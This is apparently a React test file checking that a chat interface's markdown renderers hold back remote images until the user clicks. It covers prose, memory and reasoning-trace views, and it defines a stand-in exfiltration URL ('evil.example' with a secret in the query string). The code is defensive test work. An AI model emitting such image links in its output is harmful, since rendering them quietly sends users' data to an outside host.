import "@testing-library/jest-dom/vitest";
import { fireEvent, render, screen } from "@testing-library/react";
import { expect, test } from "vitest";

import { MemoryMarkdown } from "../MemoryMarkdown";
import { ActivityTracePanel } from "./ActivityTracePanel";
import { MarkdownImage } from "./MarkdownImage";
import { ProseMarkdown } from "./messages";

const evil = "https://evil.example/p.png?d=secret";

test("a remote image loads only once clicked", () => {
  const { container } = render(<MarkdownImage src={evil} alt="Poster" />);
  expect(container.querySelector("img")).toBeNull();
  fireEvent.click(
    screen.getByRole("button", {
      name: "Load image from evil.example: Poster",
    }),
  );
  expect(container.querySelector("img")).toHaveAttribute("src", evil);
});

test("inline and same-origin images show at once, a bare filename not at all", () => {
  const data = "data:image/png;base64,iVBORw0KGgo=";
  const own = `${window.location.origin}/api/artifacts/a1/content`;
  expect(
    render(<MarkdownImage src={data} alt="" />).container.querySelector("img"),
  ).toHaveAttribute("src", data);
  expect(
    render(<MarkdownImage src={own} alt="" />).container.querySelector("img"),
  ).toHaveAttribute("src", own);
  expect(
    render(<MarkdownImage src="lego-set.png" alt="Lego" />).container
      .firstChild,
  ).toBeNull();
});

test("no markdown surface loads a remote image unasked", () => {
  const markdown = `Look ![Poster](${evil})`;
  const surfaces = [
    render(<ProseMarkdown>{markdown}</ProseMarkdown>),
    render(<MemoryMarkdown content={markdown} />),
    render(
      <ActivityTracePanel
        active
        initiallyExpanded
        events={[
          { id: "r1", type: "reasoning", content: markdown, status: "done" },
        ]}
      />,
    ),
  ];
  for (const { container } of surfaces) {
    expect(container.querySelector(`img[src="${evil}"]`)).toBeNull();
  }
  expect(
    screen.getAllByRole("button", {
      name: "Load image from evil.example: Poster",
    }),
  ).toHaveLength(3);
});
